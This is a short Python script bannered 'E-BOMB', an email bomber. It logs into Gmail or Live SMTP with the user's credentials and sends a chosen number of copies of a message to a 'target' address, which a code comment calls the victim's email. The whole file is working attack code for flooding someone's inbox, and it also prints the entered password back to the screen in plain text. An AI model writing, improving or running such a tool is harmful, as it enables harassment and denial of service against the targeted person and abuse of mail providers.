import smtplib

banner = """


		 _______         ______     ______    ___  ___   ______   
		|   ____|       |   _  \   /  __  \  |   \/   | |   _  \  
		|  |__    ______|  |_)  | |  |  |  | |  \  /  | |  |_)  | 
		|   __|  |______|   _  <  |  |  |  | |  |\/|  | |   _  <  
		|  |____        |  |_)  | |  `--'  | |  |  |  | |  |_)  | 
		|_______|       |______/   \______/  |__|  |__| |______/  
                                                          


"""
print (banner)
print ("")
try:
	server_disponible = ["Gmail", "Live"]
	i = 1
	for server in server_disponible:
		print ("[" + str(i) + "] " + server)
		i = i + 1

	server = input("Select a server > ")

	if int(server) > 0 and int(server) < i:
		if server_disponible[int(server) - 1] == "Gmail":
			print ("[+] Gmail smtp will be used")
			server = "smtp.gmail.com"
			port = 587
		elif server_disponible[int(server) - 1] == "Live":
			print ("[+] Live smtp will be used")
			server = "smtp.live.com"
			port = 465
		send = 0
		compte_email = input("Enter sender email address > ") #email
		print ("[+] Sender email address set to : " + str(compte_email))
		compte_password = input("Enter sender email password > ") #password
		print ("[+] Sender email password set to : " + str(compte_password))
		nb = input("Enter number of email to send > ")
		print ("[+] " + str(nb) + " emails will be sent")
		try:
			server = smtplib.SMTP(server, port)
			server.ehlo()
			server.starttls()
			server.login(str(compte_email), str(compte_password))
			#message
			try:
				file = open("message.txt", "r")
				message = file.read()
			except:
				message = "hello"
			#email de la victime
			email = input("Enter target email address > ")
			print ("[+] Target email address set to : " + str(email))
			while int(nb) > send:
				msg = "From : " + compte_email + "\n" + message
				server.sendmail(compte_email, email, message)
				send = send + 1
			server.quit()
			print ("[+] Finish")
		except KeyboardInterrupt:
			print ("[+] Stopped after " + str(send) + " emails")

	else:
		print ("No server corresponding")
		exit(1)

except NameError:
	print ("Invalid value entered")

except KeyboardInterrupt:
	print ("Quit")
	exit(1)
